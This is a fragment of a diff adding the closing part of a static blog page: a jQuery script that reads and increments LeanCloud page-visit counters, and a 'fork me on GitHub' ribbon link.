+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  <a href="https://github.com/echohun"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/567c3a48d796e2fc06ea80409cc9dd82bf714434/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f6461726b626c75655f3132313632312e706e67" alt="fork me on github" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png"></a>
+</body>
+</html>
